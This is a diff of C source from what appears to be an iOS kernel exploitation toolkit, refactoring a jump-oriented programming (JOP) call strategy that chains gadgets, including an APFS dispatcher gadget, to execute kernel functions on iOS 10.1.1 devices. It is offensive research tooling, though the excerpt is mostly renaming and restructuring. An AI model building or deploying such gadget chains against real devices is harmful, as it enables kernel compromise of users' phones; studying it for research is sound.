@@ -7,8 +7,8 @@
  *  jump to the first gadget, which sets up the necessary context to start executing from
  *  JOP_STACK.
  *
- *  The most important JOP gadget is the dispatcher. For jop_1, I am using this incredibly useful
- *  gadget from com.apple.filesystems.apfs:
+ *  The most important JOP gadget is the dispatcher. For this JOP program, I am using this
+ *  incredibly useful gadget from com.apple.filesystems.apfs:
  *
  *  	ldp     x2, x1, [x1]
  *  	br      x2
@@ -320,10 +320,7 @@
 #include "aarch64/jop/call_strategy.h"
 #include "aarch64/jop/gadgets_static.h"
 
-static void jop_1(uint64_t, const uint64_t[8], const uint64_t[8], kaddr_t,
-		void *, struct jop_call_initial_state *, uint64_t *);
-
-#define NEED(block, gadget)	(((uint64_t)1) << (gadget % (8 * sizeof(uint64_t))))
+#define NEED(block, gadget)	((uint64_t)1 << (gadget - 64 * block))
 
 static const uint64_t gadgets_0 =
 	  NEED(0, LDP_X2_X1_X1__BR_X2)
@@ -353,21 +350,24 @@ static const uint64_t gadgets_0 =
 	| NEED(0, MOV_X30_X21__BR_X8)
 	| NEED(0, RET);
 
-struct jop_call_strategy jop_call_strategy_1 = {
-	{ gadgets_0 }, 0x400, 0, jop_1,
-};
+static void build(uint64_t, const uint64_t[8], kaddr_t,
+		void *, struct jop_call_initial_state *, uint64_t *);
 
 /*
- * jop_1
+ * jop_call_strategy_1
  *
  * Description:
- * 	Build the JOP payload described at the top of this file.
+ * 	The JOP payload described at the top of this file.
  *
  * Platforms:
  * 	iOS 10.1.1 14B100: n71, d10
  */
+struct jop_call_strategy jop_call_strategy_1 = {
+	{ gadgets_0 }, 0x400, 0, build,
+};
+
 static void
-jop_1(uint64_t func, const uint64_t args[8], const uint64_t stack[8], kaddr_t kernel_payload,
+build(uint64_t func, const uint64_t args[8], kaddr_t kernel_payload,
 		void *payload0, struct jop_call_initial_state *initial_state,
 		uint64_t *result_address) {
 	const size_t VALUE_STACK_OFFSET  = 0;
